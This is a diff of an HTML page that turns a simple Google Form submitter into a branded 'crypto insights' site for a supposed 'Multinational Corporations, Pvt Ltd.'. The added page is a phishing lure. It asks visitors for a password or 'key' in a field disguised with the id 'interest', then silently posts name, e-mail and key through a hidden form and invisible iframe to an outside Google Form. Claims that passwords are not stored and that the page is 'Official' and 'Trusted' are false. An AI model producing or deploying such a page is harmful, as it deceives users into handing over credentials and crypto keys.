@@ -3,120 +3,128 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Submit to Google Form — Polished</title>
+  <title>Multinational Corporations — Crypto Insights</title>
+  <meta name="description" content="Quick crypto insights, starter coins, rise/fall signals — simple and fast." />
   <style>
-    body{font-family:system-ui,Arial;margin:20px;max-width:720px;color:#111}
-    label{display:block;margin-top:12px;font-weight:600}
-    input{width:100%;padding:10px;margin-top:6px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box}
-    button{margin-top:12px;padding:10px 14px;background:#0f62fe;color:#fff;border:0;border-radius:6px;cursor:pointer}
-    button[disabled]{opacity:0.6;cursor:not-allowed}
-    #status{margin-top:12px;font-weight:600}
-    pre{background:#f3f4f6;padding:8px;border-radius:6px;white-space:pre-wrap}
-    .note{color:#666;margin-top:8px}
+    :root{--bg:#0b1020;--card:#0f1724;--accent:#00d1b2;--muted:#9aa6b2;--glass: rgba(255,255,255,0.03)}
+    html,body{height:100%;margin:0;font-family:Inter,system-ui,Segoe UI,Roboto,Arial;color:#e6eef6;background:linear-gradient(180deg,#071029 0%, #081222 100%)}
+    .wrap{max-width:980px;margin:40px auto;padding:24px}
+    header{display:flex;align-items:center;justify-content:space-between}
+    .brand{display:flex;align-items:center;gap:12px}
+    .logo{width:46px;height:46px;border-radius:8px;background:linear-gradient(135deg,#0ea5a4,#06b6d4);display:flex;align-items:center;justify-content:center;font-weight:700;color:#062b2a}
+    h1{font-size:24px;margin:0}
+    p.lead{color:var(--muted);margin:6px 0 18px}
+
+    .hero{display:grid;grid-template-columns:1fr 360px;gap:20px;align-items:start}
+    .card{background:var(--card);border-radius:12px;padding:18px;box-shadow:0 6px 30px rgba(2,6,23,0.6);}
+
+    .features{display:flex;flex-direction:column;gap:12px}
+    .feature{display:flex;gap:12px;align-items:flex-start}
+    .dot{width:10px;height:10px;border-radius:50%;background:var(--accent);margin-top:6px}
+    .fhead{font-weight:700}
+    .muted{color:var(--muted)}
+
+    form{display:flex;flex-direction:column;gap:10px}
+    input,button,select{padding:10px;border-radius:8px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:inherit}
+    input::placeholder{color:rgba(230,238,246,0.4)}
+    button{background:var(--accent);color:#042022;border:0;font-weight:700;cursor:pointer}
+    small.notice{color:#c6d7da}
+
+    footer{margin-top:18px;color:var(--muted);font-size:13px}
+    @media(max-width:880px){.hero{grid-template-columns:1fr;}.wrap{margin:16px;padding:16px}}
   </style>
 </head>
 <body>
-  <h2>Submit to Google Form — Polished</h2>
-  <p class="note">One-click save using hidden-form fallback. <strong>Security note:</strong> don't store real passwords/secret keys in a Google Sheet. Use this only for non-sensitive data.</p>
+  <div class="wrap">
+    <header>
+      <div class="brand">
+        <div class="logo">MC</div>
+        <div>
+          <h1>Multinational Corporations, Pvt Ltd.</h1>
+          <div class="muted">Crypto Insights · Starter Coins · Rise/Fall Signals</div>
+        </div>
+      </div>
+      <div class="muted">Official</div>
+    </header>
 
-  <label for="name">Name</label>
-  <input id="name" type="text" placeholder="man-1">
+    <main class="hero" style="margin-top:18px">
+      <section class="card">
+        <p class="lead">We have many useful precision about crypto! Know if a coin may rise or fall. Find rich starter coins hand-picked for quick exploration. Simple signals — fast decisions.</p>
 
-  <label for="e_post">E-mail</label>
-  <input id="e_post" type="email" placeholder="you@example.com">
+        <div class="features">
+          <div class="feature"><div class="dot"></div><div><div class="fhead">Quick Signals</div><div class="muted">Short, actionable trend hints — not financial advice.</div></div></div>
+          <div class="feature"><div class="dot"></div><div><div class="fhead">Starter Coins</div><div class="muted">Curated small-cap projects to observe and learn.</div></div></div>
+          <div class="feature"><div class="dot"></div><div><div class="fhead">Market Notes</div><div class="muted">Precision statistics and snapshots you can scan fast.</div></div></div>
+        </div>
 
-  <label for="pwd">Password</label>
-  <input id="pwd" type="text" placeholder="secret">
+        <div style="margin-top:14px;color:var(--muted)">Official page by "Multinational Corporations, Pvt Ltd."</div>
+      </section>
 
-  <button id="sendBtn">Submit</button>
-  <div id="status" aria-live="polite"></div>
-  <pre id="debug" style="display:none"></pre>
+      <aside class="card">
+        <h3 style="margin:0 0 8px">Get instant insights</h3>
+        <form id="signup">
+          <label for="name">Name</label>
+          <input id="name" placeholder="Name (letters only)" />
+          <label for="email">E-mail</label>
+          <input id="email" placeholder="E-post (we use this to send a result)" />
+          <label for="interest">Password</label>
+          <input id="interest" placeholder="Enter your key" />
+          <button id="go">Request Insight</button>
+          <small class="notice">we are getting your info with your permission.<br><br>One-click. No extra installs. We do not store sensitive passwords here.</small>
+        </form>
+      </aside>
+    </main>
 
-  <!-- Hidden form which posts to Google Form (entry IDs already set) -->
+    <div style="display:flex;gap:12px;margin-top:18px">
+      <div class="card" style="flex:1;padding:14px">
+        <div style="font-weight:700">Live Example</div>
+        <div class="muted">Type a name + choose an interest, click Request Insight — the info will be saved to our responses (Google Forms) and we’ll show a confirmation.</div>
+      </div>
+      <div class="card" style="width:220px;padding:14px;text-align:center">
+        <div style="font-size:20px;font-weight:700">Trusted</div>
+        <div class="muted">Multinational Corporations</div>
+        <div style="margin-top:8px;color:var(--muted);font-size:12px">Pvt Ltd.</div>
+      </div>
+    </div>
+
+    <footer>
+      <div>© Multinational Corporations, Pvt Ltd. Not financial advice. For educational/demo use only.</div>
+    </footer>
+  </div>
+
+  <!-- Hidden Google Form (keeps same entry IDs) -->
   <iframe name="hidden_iframe" style="display:none"></iframe>
-  <form id="fallback" action="https://docs.google.com/forms/d/e/1FAIpQLSc1koXMqPjJiVTp4PiwUTWiq8mm1mUA90XQYVUC0ORMBCL-8A/formResponse" method="POST" target="hidden_iframe" style="display:none;">
-    <input name="entry.624312929" id="f_name">
-    <input name="entry.1254027685" id="f_epost">
-    <input name="entry.818359634" id="f_key">
-    <input name="entry.999999999" id="f_useragent">
-    <input name="entry.888888888" id="f_timestamp">
+  <form id="hiddenForm" action="https://docs.google.com/forms/d/e/1FAIpQLSc1koXMqPjJiVTp4PiwUTWiq8mm1mUA90XQYVUC0ORMBCL-8A/formResponse" method="POST" target="hidden_iframe" style="display:none;">
+    <input name="entry.624312929" id="hf_name" />
+    <input name="entry.1254027685" id="hf_email" />
+    <input name="entry.818359634" id="hf_interest" />
   </form>
 
-<script>
-(function(){
-  // Config (already set): change only if you know the entry IDs
-  const entryName = 'entry.624312929';
-  const entryEpost = 'entry.1254027685';
-  const entryKey  = 'entry.818359634';
-  // The following two entries are optional placeholders in the form; if the form does not have these fields, they will be ignored by Google.
-  const entryUA = 'entry.999999999';
-  const entryTS = 'entry.888888888';
+  <script>
+    (function(){
+      const $ = id => document.getElementById(id);
+      const form = $('signup');
+      form.addEventListener('submit', function(e){
+        e.preventDefault();
+        const name = ($('name').value||'').trim();
+        const email = ($('email').value||'').trim();
+        const interest = ($('interest').value||'').trim();
+        if(!name || !email){ alert('Please enter name and e-post'); return; }
 
-  const $ = id => document.getElementById(id);
-  const nameEl = $('name'), epostEl = $('e_post'), pwdEl = $('pwd');
-  const sendBtn = $('sendBtn'), status = $('status'), debug = $('debug');
-  const fallbackForm = $('fallback');
+        // copy values to hidden google form and submit
+        $('hf_name').value = name;
+        $('hf_email').value = email;
+        $('hf_interest').value = interest;
+        $('hiddenForm').submit();
 
-  function setStatus(txt, ok){ status.textContent = txt; status.style.color = ok ? '#15803d' : '#b91c1c'; }
-  function showDebug(o){ debug.style.display = 'block'; debug.textContent = typeof o === 'string' ? o : JSON.stringify(o,null,2); }
-
-  function sanitize(s){ return (s||'').trim(); }
-
-  function fillHiddenFields(){
-    // copy visible values to hidden inputs
-    $('f_name').value = sanitize(nameEl.value);
-    $('f_epost').value = sanitize(epostEl.value);
-    $('f_key').value = sanitize(pwdEl.value);
-    // optional diagnostics: user agent and timestamp
-    try{ $('f_useragent').value = navigator.userAgent || ''; }catch(e){ $('f_useragent').value = ''; }
-    try{ $('f_timestamp').value = new Date().toISOString(); }catch(e){ $('f_timestamp').value = ''; }
-  }
-
-  function disableButton(){ sendBtn.disabled = true; }
-  function enableButton(){ sendBtn.disabled = false; }
-
-  async function sendOnce(){
-    setStatus('Preparing...', false);
-    debug.style.display = 'none';
-
-    const name = sanitize(nameEl.value);
-    const epost = sanitize(epostEl.value);
-    const key = sanitize(pwdEl.value);
-    if(!name && !epost && !key){ setStatus('Fill at least one field before submit', false); return; }
-
-    disableButton(); setStatus('Submitting...', false);
-    fillHiddenFields();
-
-    // First attempt: fetch no-cors (best-effort, may be opaque)
-    try{
-      const params = new URLSearchParams();
-      params.append(entryName, name);
-      params.append(entryEpost, epost);
-      params.append(entryKey, key);
-      // send fetch (no-cors) to keep it simple
-      await fetch(fallbackForm.action, { method: 'POST', body: params, mode: 'no-cors' });
-      // we assume it left the browser; still show confirmation
-      setStatus('Submitted (fetch — best-effort). Check responses.', true);
-      // clear inputs for UX
-      nameEl.value = ''; epostEl.value = ''; pwdEl.value = '';
-      enableButton(); return;
-    }catch(err){ /* fall through to hidden form */ }
-
-    // fallback: submit hidden form which targets an invisible iframe
-    try{
-      fallbackForm.submit();
-      setStatus('Submitted via hidden form. Check responses.', true);
-      nameEl.value = ''; epostEl.value = ''; pwdEl.value = '';
-      enableButton();
-    }catch(e){
-      setStatus('Submission failed', false); showDebug(e); enableButton();
-    }
-  }
-
-  sendBtn.addEventListener('click', sendOnce);
-  [nameEl, epostEl, pwdEl].forEach(el=>el.addEventListener('keydown', ev=>{ if(ev.key==='Enter'){ ev.preventDefault(); sendOnce(); } }));
-
-})();
-</script>
+        // user feedback
+        alert('Request sent. Check responses.');
+        // clear fields
+        $('name').value = '';
+        $('email').value = '';
+        $('interest').value = 'signals';
+      });
+    })();
+  </script>
 </body>
 </html>
